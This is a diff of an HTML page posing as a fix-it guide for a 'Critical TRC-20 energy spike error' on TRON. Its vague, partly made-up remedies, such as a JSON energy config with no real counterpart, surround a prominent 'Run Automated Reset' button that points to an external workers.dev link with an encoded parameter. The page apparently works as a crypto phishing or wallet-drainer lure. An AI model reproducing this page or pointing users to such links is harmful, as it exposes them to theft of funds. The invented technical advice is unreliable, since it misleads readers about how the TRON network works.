@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption for TRC-20 token transactions on the TRON network.</li>
+<li>Users experience a "Critical TRC-20 energy spike error" when attempting to conduct transactions on the TRON network, resulting in failed transactions and potential loss of assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy demand, often caused by a large number of transactions being processed simultaneously, exceeding the available energy capacity of the user's account.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 smart contracts, exceeding the allocated energy limits and causing the transaction to fail.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's energy capacity by freezing additional TRX tokens.</li>
-<li>Adjust the transaction parameters to reduce energy consumption, such as decreasing the transaction size or using a more energy-efficient smart contract.</li>
-<li>Use the following command to update the account's energy settings:</li>
+<li>Increase the energy limit for the specific TRC-20 contract to accommodate the increased energy requirements.</li>
+<li>Optimize the contract's code to reduce energy consumption and prevent future spikes.</li>
+<li>Use the following JSON configuration to update the energy settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">100</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="s1">&#39;0x...&#39;</span><span class="w"> </span><span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;energy_limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energy_fee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced debugging and troubleshooting capabilities.</p>
+<p>Consider utilizing an external console for more advanced debugging and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of TRON's energy system and transaction mechanics</li>
-<li>Access to the TRONWeb API and a compatible wallet</li>
-<li>Sufficient TRX tokens to cover energy costs and potential freezing requirements</li>
+<li>Basic understanding of TRON's energy management system</li>
+<li>Access to the TRON network and relevant contract addresses</li>
+<li>Familiarity with JSON configuration files and smart contract optimization techniques</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
-    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
